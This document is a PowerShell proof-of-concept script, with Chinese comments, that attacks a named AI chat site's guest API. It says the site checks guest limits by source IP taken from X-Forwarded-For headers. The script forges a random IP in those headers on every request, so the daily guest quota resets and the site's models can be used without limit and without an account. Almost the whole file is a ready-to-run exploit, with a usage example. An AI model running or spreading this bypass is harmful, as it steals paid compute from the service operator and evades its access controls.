<#
.SYNOPSIS
  se.zzmax.cn /api/chat/stream 访客免鉴权 + XFF 伪造额度重置 PoC (PowerShell)
.NOTES
  - /api/chat/models  /api/chat/stream  访客模式不校验登录 (无需 token)
  - 服务端按 "源IP" (取自 X-Forwarded-For/X-Real-IP) 限制访客每日 2 次
  - 伪造该头即可即时重置额度 -> 无限免费调用全模型, 无需账号/Key
.EXAMPLE
  .\poc_chat_hijack.ps1 -N 3 -Prompt "1+1=?"
#>
param([int]$N=1,[string]$Prompt="用一句话介绍你自己.")
$ErrorActionPreference="Stop"
$Base="https://se.zzmax.cn"
$Model="deepseek"; $Sub="deepseek-v4-pro"   # 免费 tier=normal 档
function New-RandIP{
  $r=New-Object System.Random (Get-Random -Maximum ([int]::MaxValue))
  ("{0}.{1}.{2}.{3}" -f (1+$r.Next(250)),$r.Next(256),$r.Next(256),(1+$r.Next(250)))
}
for($i=1;$i -le $N;$i++){
  $ip=New-RandIP
  $obj=[ordered]@{model=$Model;subModel=$Sub;messages=@(@{role="user";content=$Prompt});stream=$true}
  $body=$obj | ConvertTo-Json -Compress -Depth 5
  $tmp=[IO.Path]::GetTempFileName(); Set-Content -Path $tmp -Value $body -Encoding utf8 -NoNewline
  Write-Host "===== call #$i (伪造 XFF=$ip) ====="
  curl.exe -sN --max-time 60 -H "Content-Type: application/json" -H "User-Agent: Mozilla/5.0" `
    -H "X-Forwarded-For: $ip" -H "X-Real-IP: $ip" --data-binary "@$tmp" "$Base/api/chat/stream"
  Remove-Item $tmp -Force; Write-Host ""
}
